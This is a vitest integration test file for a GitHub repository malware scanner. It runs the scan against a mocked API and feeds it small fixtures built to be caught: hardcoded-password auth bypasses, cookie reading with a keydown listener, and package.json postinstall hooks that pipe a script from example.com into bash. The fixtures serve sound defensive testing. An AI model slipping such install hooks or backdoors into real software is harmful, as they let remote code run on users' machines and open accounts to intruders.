/**
 * Integration tests for scanGitHubRepo.
 *
 * Drives the full scan through a mocked GitHub API (fetch), verifying that the
 * detectors and risk scoring actually fire end-to-end on representative
 * benign-but-detectable fixtures — no real network, no real malware.
 */

import { afterEach, describe, expect, it, vi } from "vitest"
import { scanGitHubRepo } from "../src/github/repo-scanner"
import type { SignatureDatabase } from "../src/types/index"

const EMPTY_SIGNATURES: SignatureDatabase = {
  version: "test",
  lastUpdated: new Date(),
  maliciousPackages: [],
  yaraRules: [],
  knownBadHashes: []
}

const MOCK_COMMIT_SHA = "0123456789abcdef0123456789abcdef01234567"

/** Build a fetch mock that serves an in-memory file tree as the GitHub API. */
function mockGitHubApi(files: Record<string, string>) {
  return vi.fn(async (input: RequestInfo | URL) => {
    const url = String(input)

    if (url.includes("api.npmjs.org")) {
      return new Response(JSON.stringify({ downloads: 500_000 }), { status: 200 })
    }
    if (/\/commits\/[^/]+$/.test(url)) {
      return new Response(JSON.stringify({ sha: MOCK_COMMIT_SHA }), { status: 200 })
    }
    if (url.includes("/git/trees/")) {
      const tree = Object.keys(files).map((path) => ({
        path,
        type: "blob" as const,
        sha: path,
        url: path
      }))
      return new Response(JSON.stringify({ sha: "x", truncated: false, tree }), {
        status: 200
      })
    }
    const contentMatch = url.match(/\/contents\/(.+?)\?ref=/)
    if (contentMatch) {
      const path = decodeURIComponent(contentMatch[1]!)
      const content = files[path]
      if (content === undefined) return new Response("{}", { status: 404 })
      const b64 = Buffer.from(content, "utf-8").toString("base64")
      return new Response(JSON.stringify({ content: b64 }), { status: 200 })
    }
    return new Response("{}", { status: 404 })
  })
}

const repoInfo = {
  owner: "acme",
  repo: "sample",
  branch: "main",
  url: "https://github.com/acme/sample"
}

async function scan(files: Record<string, string>) {
  global.fetch = mockGitHubApi(files) as unknown as typeof fetch
  return scanGitHubRepo(repoInfo, { signatures: EMPTY_SIGNATURES })
}

afterEach(() => {
  vi.restoreAllMocks()
})

describe("scanGitHubRepo integration", () => {
  it("returns low risk and no findings for a clean repo", async () => {
    const result = await scan({
      "src/index.js": `export function add(a, b) {\n  return a + b\n}\n`
    })
    expect(result.riskLevel).toBe("low")
    expect(result.findings).toHaveLength(0)
    expect(result.safeToClone).toBe(true)
    expect(result.scanSummary.filesScanned).toBe(1)
  })

  it("pins the whole scan to one commit SHA (TOCTOU)", async () => {
    global.fetch = mockGitHubApi({
      "src/index.js": `export const x = 1\n`
    }) as unknown as typeof fetch
    const result = await scanGitHubRepo(repoInfo, { signatures: EMPTY_SIGNATURES })

    // The verdict carries the scanned commit…
    expect(result.commitSha).toBe(MOCK_COMMIT_SHA)

    // …and every tree/content request was made against that SHA, never the
    // mutable branch name.
    const urls = (global.fetch as ReturnType<typeof vi.fn>).mock.calls.map((c) => String(c[0]))
    const treeUrl = urls.find((u) => u.includes("/git/trees/"))
    expect(treeUrl).toContain(`/git/trees/${MOCK_COMMIT_SHA}`)
    for (const u of urls.filter((u) => u.includes("/contents/"))) {
      expect(u).toContain(`ref=${MOCK_COMMIT_SHA}`)
    }
  })

  it("flags a critical backdoor (hardcoded auth bypass)", async () => {
    const result = await scan({
      "src/auth.js": `export function ok(password) {\n  if (password == "letmein") {\n    return true\n  }\n  return false\n}\n`
    })
    const backdoor = result.findings.find((f) => f.type === "BACKDOOR")
    expect(backdoor).toBeDefined()
    expect(backdoor!.severity).toBe("critical")
  })

  it("flags data exfiltration (cookie + keylogger)", async () => {
    const result = await scan({
      "src/t.js": `export function grab() {\n  const c = document.cookie\n  document.addEventListener("keydown", (e) => console.log(e.key))\n  return c\n}\n`
    })
    const exfil = result.findings.find((f) => f.type === "DATA_EXFILTRATION")
    expect(exfil).toBeDefined()
    expect(exfil!.severity).toBe("critical")
    // Evidence pinpoints the matched lines for display and #L deep links.
    expect(exfil!.evidence).toEqual([
      { line: 2, code: "const c = document.cookie" },
      { line: 3, code: `document.addEventListener("keydown", (e) => console.log(e.key))` }
    ])
  })

  it("flags a supply-chain postinstall that fetches over the network", async () => {
    const result = await scan({
      "package.json": JSON.stringify({
        name: "sample",
        scripts: { postinstall: "curl https://example.com/setup.sh | bash" }
      })
    })
    const postinstall = result.findings.find((f) => f.type === "POSTINSTALL_SCRIPT")
    expect(postinstall).toBeDefined()
    expect(postinstall!.severity).toBe("high")
  })

  it("scores a repo with multiple critical findings as high risk", async () => {
    const result = await scan({
      "package.json": JSON.stringify({
        name: "sample",
        scripts: { postinstall: "curl https://example.com/x.sh | bash" }
      }),
      "src/auth.js": `if (password == "admin123") { return true }\n`,
      "src/t.js": `const c = document.cookie\ndocument.addEventListener("keydown", () => {})\n`
    })
    expect(result.riskLevel).toBe("high")
    expect(result.safeToClone).toBe(false)
    expect(result.findings.length).toBeGreaterThanOrEqual(3)
  })
})

describe("hardcoded-IP detection (false-positive guardrails)", () => {
  it("does not flag invalid or over-long dotted numbers as IPs", async () => {
    const result = await scan({
      // impossible octets and a 5-part version string — neither is a valid IPv4
      "src/v.js": `export const A = "999.999.999.999"\nexport const BUILD = "10.20.30.40.50"\n`
    })
    const netFinding = result.findings.find(
      (f) => f.type === "NETWORK_COMMUNICATION"
    )
    expect(netFinding).toBeUndefined()
  })

  it("flags a genuine hardcoded public IP", async () => {
    const result = await scan({
      "src/net.js": `export const HOST = "203.0.113.42"\nfetch("http://" + HOST)\n`
    })
    const netFinding = result.findings.find(
      (f) => f.type === "NETWORK_COMMUNICATION"
    )
    expect(netFinding).toBeDefined()
  })
})
